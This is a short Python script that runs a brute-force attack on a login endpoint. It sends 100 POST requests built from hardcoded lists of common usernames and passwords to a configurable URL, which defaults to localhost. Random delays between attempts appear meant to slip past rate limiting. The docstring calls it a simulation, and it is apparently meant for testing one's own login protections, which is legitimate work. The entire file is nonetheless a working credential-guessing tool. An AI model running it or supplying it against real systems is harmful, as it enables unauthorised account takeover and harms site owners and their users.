import requests
import random
import time

# URL of the target endpoint (adjust accordingly)
TARGET_URL = 'http://localhost:8000/login/'  # Update this URL to match your target

# List of common usernames and passwords for the brute-force attack
usernames = ['admin', 'user', 'test', 'owen']
passwords = ['1234', 'owen', '123456', 'password', 'admin', 'root', 'toor', 'letmein', 'qwerty', 'abc123', '1q2w3e4r']

def simulate_brute_force_attack():
    """
    Simulates a brute-force attack by attempting multiple login requests with different username-password combinations.
    """
    for _ in range(100):  # Adjust the number of attempts as needed
        username = random.choice(usernames)
        password = random.choice(passwords)
        payload = {
            'username': username,
            'password': password
        }
        
        try:
            response = requests.post(TARGET_URL, data=payload)
            print(f"Attempt with Username: {username}, Password: {password}, Status Code: {response.status_code}")
            
            if response.status_code == 200:
                print("Login successful!")
            else:
                print("Login failed!")

            time.sleep(random.uniform(0.5, 1.5))  # Sleep for a random interval between attempts

        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

if __name__ == "__main__":
    simulate_brute_force_attack()
